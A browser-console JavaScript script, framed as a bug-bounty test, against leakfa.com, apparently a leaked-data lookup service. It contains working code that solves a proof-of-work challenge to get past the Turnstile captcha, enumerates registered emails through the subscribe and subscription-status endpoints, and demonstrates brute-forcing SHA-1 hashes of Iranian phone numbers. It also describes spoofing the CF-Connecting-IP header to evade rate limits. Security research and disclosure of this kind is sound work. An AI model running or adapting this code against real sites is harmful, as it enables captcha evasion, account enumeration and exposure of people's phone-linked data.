/**
 * Leakfa.com Bug Bounty - Vulnerability Test Script
 *
 * HOW TO USE:
 * 1. Open https://leakfa.com in your browser
 * 2. Wait for Cloudflare challenge to pass (you'll see the site)
 * 3. Open DevTools (F12) -> Console tab
 * 4. Paste this entire script and press Enter
 *
 * VULNERABILITIES BEING TESTED:
 * 1. PoW Oracle - error message reveals internal POW_DIFF constant
 * 2. User Enumeration via /api/subscribe.php
 * 3. User Enumeration via /api/subscription_status.php
 * 4. Turnstile Bypass via PoW (automated search without captcha)
 * 5. IP Header Spoofing via CF-Connecting-IP
 */

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ============================================================
// VULNERABILITY 1: PoW Oracle - reveals POW_DIFF
// ============================================================
async function test_pow_oracle() {
    console.log('\n[TEST 1] PoW Oracle - Testing if error reveals POW_DIFF...');

    const r = await fetch('/api/search.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'hash=da39a3ee5e6b4b0d3255bfef95601890afd80709&mode=pow&nonce=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    });
    const data = await r.json();
    console.log('[TEST 1] Response:', data);

    if (data.error && data.error.includes('Nonce must meet')) {
        console.log('[TEST 1] *** VULNERABLE! POW_DIFF leaked in error message ***');
        console.log('[TEST 1] Error reveals algorithm + difficulty:', data.error);
        // Extract POW_DIFF from error
        const match = data.error.match(/sha1 \(request hash \+ nonce\)(\d+) Bit/);
        if (match) {
            console.log('[TEST 1] POW_DIFF =', match[1]);
        }
    } else {
        console.log('[TEST 1] Not vulnerable or behavior changed');
    }
    return data;
}

// ============================================================
// VULNERABILITY 2: Turnstile Bypass via PoW (after getting POW_DIFF)
// ============================================================
async function solve_pow(hash, powDiff) {
    const prefix = 'a'.repeat(powDiff);
    let nonce = 0;
    while (true) {
        const nonceStr = nonce.toString();
        const toHash = hash + nonceStr;
        // SHA-1 in browser using SubtleCrypto
        const encoder = new TextEncoder();
        const data = encoder.encode(toHash);
        const hashBuffer = await crypto.subtle.digest('SHA-1', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        if (hashHex.startsWith(prefix)) {
            return nonceStr;
        }
        nonce++;
        if (nonce % 10000 === 0) console.log(`[PoW] Trying nonce ${nonce}...`);
    }
}

async function test_pow_bypass(powDiff) {
    console.log(`\n[TEST 2] Testing PoW Bypass with POW_DIFF=${powDiff}...`);

    // Hash of test phone 09123456789
    const testHash = await sha1_str('09123456789');
    console.log('[TEST 2] Searching for hash of 09123456789:', testHash);

    console.log(`[TEST 2] Solving PoW challenge (difficulty=${powDiff})...`);
    const start = Date.now();
    const nonce = await solve_pow(testHash, powDiff);
    console.log(`[TEST 2] PoW solved in ${Date.now()-start}ms, nonce=${nonce}`);

    const r = await fetch('/api/search.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `hash=${testHash}&mode=pow&nonce=${nonce}`
    });
    const data = await r.json();
    console.log('[TEST 2] Search result (bypassed Turnstile via PoW):', data);
    return data;
}

async function sha1_str(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-1', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// ============================================================
// VULNERABILITY 3: User Enumeration via /api/subscribe.php
// - Different error for registered+verified vs not-registered email
// ============================================================
async function test_user_enum_subscribe(testEmail) {
    console.log(`\n[TEST 3] User Enumeration via subscribe.php for: ${testEmail}`);

    // Get a turnstile token from the page
    let token = '';
    try {
        // Try to get existing token from the page
        const iframe = document.querySelector('iframe[src*="challenges.cloudflare.com"]');
        if (iframe) {
            console.log('[TEST 3] Turnstile iframe found - need valid token');
        }
    } catch(e) {}

    // Without token, test the validation flow
    const fakeHash = await sha1_str('09123456789');

    const r = await fetch('/api/subscribe.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `email=${encodeURIComponent(testEmail)}&hash=${fakeHash}&token=INVALID_TOKEN&name=Test`
    });
    const data = await r.json();
    console.log('[TEST 3] Subscribe response:', data);

    // Key insight: if email validation fails BEFORE turnstile check,
    // we get email-related error. If turnstile fails, we get turnstile error.
    // The CODE checks email validity first, then turnstile!
    // But actually looking at the code: it checks hash then email format then turnstile
    // So with valid format email + invalid turnstile -> turnstile error
    // This itself doesn't enumerate... BUT:
    // With VALID turnstile token, different responses reveal user existence

    if (data.error) {
        if (data.error.includes('تأیید امنیتی') || data.error.includes('Turnstile')) {
            console.log('[TEST 3] Turnstile blocking - need valid token to confirm enum');
        } else if (data.error.includes('قبلا ثبت شده')) {
            console.log(`[TEST 3] *** CONFIRMED: ${testEmail} IS REGISTERED AND VERIFIED ***`);
        } else if (data.error.includes('مطابقت ندارد')) {
            console.log(`[TEST 3] *** CONFIRMED: ${testEmail} IS REGISTERED (wrong phone) ***`);
        } else if (data.error.includes('تایید نشده')) {
            console.log(`[TEST 3] *** CONFIRMED: ${testEmail} is registered but NOT verified ***`);
        }
    }
    return data;
}

// ============================================================
// VULNERABILITY 4: User Enumeration via /api/subscription_status.php
// Even easier - just email required!
// ============================================================
async function test_subscription_status_enum(testEmail) {
    console.log(`\n[TEST 4] Subscription Status Enum for: ${testEmail}`);

    const r = await fetch('/api/subscription_status.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `email=${encodeURIComponent(testEmail)}&token=INVALID_TOKEN`
    });
    const data = await r.json();
    console.log('[TEST 4] subscription_status response:', data);

    if (data.result === 'subscribed') {
        console.log(`[TEST 4] *** CONFIRMED: ${testEmail} IS SUBSCRIBED AND VERIFIED ***`);
    } else if (data.result === 'verification_pending') {
        console.log(`[TEST 4] *** CONFIRMED: ${testEmail} IS REGISTERED (pending verification) ***`);
    } else if (data.result === 'not_subscribed') {
        console.log(`[TEST 4] *** CONFIRMED: ${testEmail} is NOT subscribed ***`);
    } else if (data.error && data.error.includes('Turnstile')) {
        console.log('[TEST 4] Turnstile blocking - need valid token');
    }
    return data;
}

// ============================================================
// VULNERABILITY 5: IP Spoofing via CF-Connecting-IP header
// (if direct origin access is possible)
// ============================================================
async function test_ip_spoofing() {
    console.log('\n[TEST 5] IP Spoofing via CF-Connecting-IP header...');
    console.log('[TEST 5] NOTE: CF strips this header normally, but test if origin is directly accessible');

    // This won't work from browser due to browser security, but document the finding
    console.log('[TEST 5] Vector: POST /api/search.php with header: CF-Connecting-IP: 1.2.3.4');
    console.log('[TEST 5] Impact: Bypass IP-based rate limiting in search_log()');
    console.log('[TEST 5] Code: get_ip() = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER["REMOTE_ADDR"]');
}

// ============================================================
// VULNERABILITY 6: SHA-1 Brute Force for Iranian Phone Numbers
// ============================================================
async function demo_phone_brute_force() {
    console.log('\n[TEST 6] SHA-1 Phone Brute Force Demo...');
    console.log('[TEST 6] Iranian phones: 09XX-XXX-XXXX = 10^8 = 100M combinations');
    console.log('[TEST 6] With PoW bypass, can enumerate all registered phones');

    // Demo: Generate a few hashes
    const testPhones = ['09123456789', '09001234567', '09121234567'];
    for (const phone of testPhones) {
        const hash = await sha1_str(phone);
        console.log(`[TEST 6] SHA1(${phone}) = ${hash}`);
    }
}

// ============================================================
// MAIN - Run all tests
// ============================================================
async function runAllTests() {
    console.log('='.repeat(60));
    console.log('Leakfa.com Vulnerability Tests');
    console.log('='.repeat(60));

    // Test 1: PoW Oracle
    const powOracleResult = await test_pow_oracle();

    // Extract POW_DIFF if found
    let powDiff = 3; // default assumption
    if (powOracleResult.error) {
        const match = powOracleResult.error.match(/\)(\d+) Bit/);
        if (match) powDiff = parseInt(match[1]);
    }

    await sleep(500);

    // Test 2: Turnstile Bypass via PoW (if diff is reasonable)
    if (powDiff <= 5) {
        await test_pow_bypass(powDiff);
    } else {
        console.log(`\n[TEST 2] Skipping PoW bypass - difficulty too high: ${powDiff}`);
    }

    await sleep(500);

    // Test 3: User Enumeration via subscribe
    // Use a known email or test email
    await test_user_enum_subscribe('test@example.com');

    await sleep(500);

    // Test 4: Subscription Status Enum
    await test_subscription_status_enum('test@example.com');

    await sleep(500);

    // Test 5: IP Spoofing doc
    await test_ip_spoofing();

    await sleep(500);

    // Test 6: Brute force demo
    await demo_phone_brute_force();

    console.log('\n' + '='.repeat(60));
    console.log('Tests complete! Check results above.');
    console.log('='.repeat(60));
}

// Run
runAllTests().catch(console.error);
